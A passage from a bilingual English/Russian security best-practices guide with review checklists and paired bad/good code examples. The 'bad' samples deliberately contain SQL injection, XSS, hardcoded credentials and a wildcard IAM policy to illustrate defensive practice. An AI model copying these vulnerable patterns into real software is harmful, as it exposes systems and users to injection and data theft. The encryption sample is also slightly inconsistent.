16. **Strong Password Policy** - minimum 12 chars, complexity, rotation
17. **Privileged Access Management** - use PAM for admin access
18. **Service Account Governance** - track and rotate service accounts

### Security Operations
19. **Centralized Logging** - aggregate logs in SIEM
20. **Real-time Monitoring** - detect anomalies immediately
21. **Automated Response** - use SOAR for common incidents
22. **Threat Hunting** - proactively search for threats
23. **Vulnerability SLAs** - critical 24-48h, high 7d, medium 30d
24. **Incident Response Plan** - document and test regularly
25. **Tabletop Exercises** - practice incident response quarterly
26. **Post-Incident Reviews** - learn from every incident

### Application Security
27. **Shift Left Security** - integrate security in CI/CD
28. **SAST + DAST + SCA** - use multiple scanning tools
29. **Secure Code Review** - review critical changes
30. **OWASP Top 10** - mitigate all OWASP vulnerabilities
31. **Input Validation** - validate and sanitize all inputs
32. **Output Encoding** - encode outputs to prevent XSS
33. **Parameterized Queries** - prevent SQL injection
34. **Security Headers** - use CSP, HSTS, X-Frame-Options
35. **API Security** - authentication, rate limiting, input validation
36. **Dependency Management** - keep dependencies updated

### Cloud Security
37. **CSPM** - continuous security posture management
38. **IaC Scanning** - scan Terraform/CloudFormation before deploy
39. **Container Security** - scan images, runtime protection
40. **Least Privilege IAM** - minimal permissions for roles
41. **Encryption by Default** - enable encryption for all services
42. **Network Policies** - restrict traffic between services
43. **Audit Logging** - enable CloudTrail/Activity Log
44. **Resource Tagging** - tag resources for governance

### Compliance
45. **Continuous Compliance** - not one-time, ongoing process
46. **Automate Evidence** - collect evidence automatically
47. **Control Mapping** - map controls to multiple frameworks
48. **Document Everything** - if not documented, doesn't exist
49. **Internal Audits** - conduct before external audits
50. **Compliance Calendar** - track all deadlines

---

## Checklist для Security Review

### Architecture Review
- [ ] Defense in depth implemented (multiple security layers)
- [ ] Zero Trust principles applied (verify every request)
- [ ] Network segmentation in place (DMZ, internal zones)
- [ ] Encryption at rest and in transit (TLS 1.3, AES-256)
- [ ] Secure defaults configured (no default passwords)
- [ ] Fail-safe mechanisms implemented (fail securely)
- [ ] Security boundaries clearly defined (trust boundaries)
- [ ] Threat model documented (STRIDE, attack trees)

### Access Control Review
- [ ] MFA enforced for all users (no exceptions)
- [ ] Least privilege access implemented (minimal permissions)
- [ ] Privileged access managed (PAM solution)
- [ ] Regular access reviews scheduled (quarterly)
- [ ] Service accounts inventoried and rotated
- [ ] Shared accounts eliminated (unique credentials)
- [ ] Password policy enforced (12+ chars, complexity)
- [ ] Just-in-time access available (temporary elevation)

### Application Security Review
- [ ] SAST scanning in CI/CD (Snyk, SonarQube)
- [ ] DAST scanning performed (OWASP ZAP)
- [ ] SCA for dependencies (vulnerability scanning)
- [ ] OWASP Top 10 mitigated (all vulnerabilities)
- [ ] Input validation implemented (whitelist approach)
- [ ] Output encoding applied (prevent XSS)
- [ ] Parameterized queries used (no SQL injection)
- [ ] Security headers configured (CSP, HSTS, etc.)
- [ ] API authentication required (OAuth2, JWT)
- [ ] Rate limiting implemented (prevent abuse)
- [ ] Error handling secure (no sensitive info leaked)
- [ ] Secrets not in code (use secrets manager)

### Cloud Security Review
- [ ] CSPM enabled (Wiz, Prisma Cloud)
- [ ] IaC scanning in pipeline (Snyk, Checkov)
- [ ] Container images scanned (Trivy, Aqua)
- [ ] IAM least privilege (minimal permissions)
- [ ] Encryption enabled (KMS, managed keys)
- [ ] Network policies configured (security groups)
- [ ] Audit logging enabled (CloudTrail, Activity Log)
- [ ] Resource tagging enforced (governance)
- [ ] Backup and DR configured (RTO/RPO defined)
- [ ] Cost monitoring enabled (prevent crypto mining)

### Security Operations Review
- [ ] SIEM deployed and configured (Splunk, Sentinel)
- [ ] Log aggregation working (all systems logging)
- [ ] Alerting rules defined (critical events)
- [ ] Incident response plan documented
- [ ] Incident response team identified (roles)
- [ ] Runbooks created (common scenarios)
- [ ] Vulnerability scanning automated (weekly)
- [ ] Patch management process (SLAs defined)
- [ ] Threat intelligence integrated (feeds)
- [ ] Security metrics tracked (MTTD, MTTR)

### Compliance Review
- [ ] Compliance requirements identified (SOC2, ISO27001)
- [ ] Control mapping completed (frameworks)
- [ ] Policies and procedures documented
- [ ] Evidence collection automated (where possible)
- [ ] Access reviews completed (quarterly)
- [ ] Security training completed (all employees)
- [ ] Vendor risk assessments done (third parties)
- [ ] Audit readiness verified (mock audit)
- [ ] Compliance calendar maintained (deadlines)
- [ ] Continuous monitoring enabled (controls)

### Data Protection Review
- [ ] Data classification defined (public, internal, confidential)
- [ ] Data inventory maintained (know your data)
- [ ] Encryption at rest (AES-256)
- [ ] Encryption in transit (TLS 1.3)
- [ ] Key management implemented (KMS, Vault)
- [ ] Data retention policy defined (GDPR compliance)
- [ ] Data deletion process (right to be forgotten)
- [ ] DLP solution deployed (prevent data leakage)
- [ ] Backup encryption enabled (encrypted backups)
- [ ] Data masking for non-prod (PII protection)

---

## Антипаттерны

### ❌ BAD: Single Layer of Defense

```yaml
# Только firewall, нет других controls
security:
  - firewall: enabled
  # Нет IDS/IPS, WAF, encryption, monitoring
```

**Проблемы**:
- Single point of failure
- Если firewall bypassed - полный доступ
- Нет detection внутри периметра

### ✅ GOOD: Defense in Depth

```yaml
security:
  network:
    - firewall: enabled
    - ids_ips: enabled
    - network_segmentation: true
  application:
    - waf: enabled
    - rate_limiting: true
    - input_validation: strict
  data:
    - encryption_at_rest: AES-256
    - encryption_in_transit: TLS-1.3
  monitoring:
    - siem: enabled
    - edr: enabled
    - log_aggregation: true
```

---

### ❌ BAD: Trust by Default

```python
# Доверяем всем requests внутри сети
def process_request(request):
    # Нет authentication/authorization
    return execute_query(request.query)
```

**Проблемы**:
- Lateral movement после breach
- Insider threats не detected
- Нет audit trail

### ✅ GOOD: Zero Trust

```python
def process_request(request):
    # Verify identity
    user = authenticate(request.token)
    if not user:
        raise Unauthorized()
    
    # Verify authorization
    if not authorize(user, request.resource, request.action):
        raise Forbidden()
    
    # Log access
    audit_log.record(user, request.resource, request.action)
    
    # Execute with least privilege
    return execute_query(request.query, user.permissions)
```

---

### ❌ BAD: Secrets in Code

```python
# Hardcoded credentials
DATABASE_URL = "postgresql://admin:P@ssw0rd123@db.example.com/prod"
API_KEY = "sk_live_abc123xyz789"

def connect():
    return psycopg2.connect(DATABASE_URL)
```

**Проблемы**:
- Secrets в git history
- Exposed в logs, errors
- Невозможно rotate без deploy

### ✅ GOOD: Secrets Management

```python
import boto3
from botocore.exceptions import ClientError

def get_secret(secret_name):
    client = boto3.client('secretsmanager')
    try:
        response = client.get_secret_value(SecretId=secret_name)
        return response['SecretString']
    except ClientError as e:
        raise e

# Use secrets from vault
DATABASE_URL = get_secret('prod/database/url')
API_KEY = get_secret('prod/api/key')

def connect():
    return psycopg2.connect(DATABASE_URL)
```

---

### ❌ BAD: No Input Validation

```python
# SQL injection vulnerability
def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    return db.execute(query)

# XSS vulnerability
def render_comment(comment):
    return f"<div>{comment}</div>"
```

**Проблемы**:
- SQL injection
- XSS attacks
- Command injection

### ✅ GOOD: Input Validation & Output Encoding

```python
from html import escape
import re

def get_user(user_id):
    # Parameterized query
    query = "SELECT * FROM users WHERE id = %s"
    return db.execute(query, (user_id,))

def render_comment(comment):
    # Validate input
    if not re.match(r'^[\w\s.,!?-]{1,500}$', comment):
        raise ValueError("Invalid comment")
    
    # Encode output
    safe_comment = escape(comment)
    return f"<div>{safe_comment}</div>"
```

---

### ❌ BAD: Overprivileged Access

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
```

**Проблемы**:
- Full admin access
- Blast radius огромный
- Compliance violation

### ✅ GOOD: Least Privilege

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:GetObject",
      "s3:PutObject"
    ],
    "Resource": "arn:aws:s3:::my-bucket/uploads/*"
  }]
}
```

---

### ❌ BAD: No Logging/Monitoring

```python
def login(username, password):
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(password):
        return create_session(user)
    return None  # Нет logging failed attempts
```

**Проблемы**:
- Brute force не detected
- Нет audit trail
- Incident response затруднён

### ✅ GOOD: Comprehensive Logging

```python
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

def login(username, password, ip_address):
    logger.info(f"Login attempt: user={username}, ip={ip_address}")
    
    user = User.query.filter_by(username=username).first()
    
    if user and user.check_password(password):
        logger.info(f"Login success: user={username}, ip={ip_address}")
        audit_log.record({
            'event': 'login_success',
            'user': username,
            'ip': ip_address,
            'timestamp': datetime.utcnow()
        })
        return create_session(user)
    
    logger.warning(f"Login failed: user={username}, ip={ip_address}")
    audit_log.record({
        'event': 'login_failed',
        'user': username,
        'ip': ip_address,
        'timestamp': datetime.utcnow()
    })
    
    # Check for brute force
    if check_brute_force(username, ip_address):
        logger.error(f"Brute force detected: user={username}, ip={ip_address}")
        alert_security_team(username, ip_address)
    
    return None
```

---

### ❌ BAD: Unencrypted Data

```python
# Storing sensitive data in plaintext
def save_credit_card(user_id, card_number):
    db.execute(
        "INSERT INTO payments (user_id, card_number) VALUES (%s, %s)",
        (user_id, card_number)
    )
```

**Проблемы**:
- PCI-DSS violation
- Data breach risk
- Regulatory fines

### ✅ GOOD: Encrypted Data

```python
from cryptography.fernet import Fernet
import boto3

def get_encryption_key():
    kms = boto3.client('kms')
    response = kms.decrypt(
        CiphertextBlob=ENCRYPTED_KEY
    )
    return response['Plaintext']

def save_credit_card(user_id, card_number):
    # Tokenize instead of storing
    token = payment_gateway.tokenize(card_number)
    
    # Or encrypt if must store
    cipher = Fernet(get_encryption_key())
    encrypted = cipher.encrypt(card_number.encode())
    
    db.execute(
        "INSERT INTO payments (user_id, card_token) VALUES (%s, %s)",
        (user_id, token)
    )
```

---

### ❌ BAD: No Incident Response Plan

```text
# Когда происходит breach:
"Что делать?? Кого звать?? Где логи??"
```

**Проблемы**:
- Chaos during incident
- Delayed response
- Evidence destroyed

### ✅ GOOD: Documented Incident Response

```yaml
incident_response_plan:
  severity_p0_critical:
    detection:
      - SIEM alert triggers
      - Security team notified immediately
    
    containment:
      - Isolate affected systems
      - Block malicious IPs
      - Disable compromised accounts
      - Preserve evidence
    
    investigation:
      - Collect logs from SIEM
      - Analyze memory dumps
      - Review access logs
      - Determine scope
    
    eradication:
      - Remove malware
      - Patch vulnerabilities
      - Reset credentials
    
    recovery:
      - Restore from backups
      - Verify system integrity
      - Return to production
    
    post_incident:
      - Root cause analysis
      - Update playbooks
      - Executive report
      - Regulatory notification (if required)
    
    contacts:
      - CISO: +1-xxx-xxx-xxxx
      - Security Team: security@example.com
      - Legal: legal@example.com
      - PR: pr@example.com
```

---

## When to Engage Security & Compliance

### Required Engagement
- New system or application design
- Architecture changes affecting security boundaries
- Regulatory compliance initiatives
- Security incidents
- Vendor risk assessments
- Pre-production security reviews
- Audit preparation
- Data breach or suspected breach

### Recommended Engagement
- Major feature releases
- Cloud migrations
- M&A due diligence
- Infrastructure changes
- New third-party integrations
- Significant process changes
- Security tool selection
- Policy updates

### Continuous Collaboration
- Security review of pull requests (for critical systems)
- Vulnerability remediation prioritization
- Security awareness and training
- Threat intelligence sharing
- Risk assessment updates
- Compliance monitoring
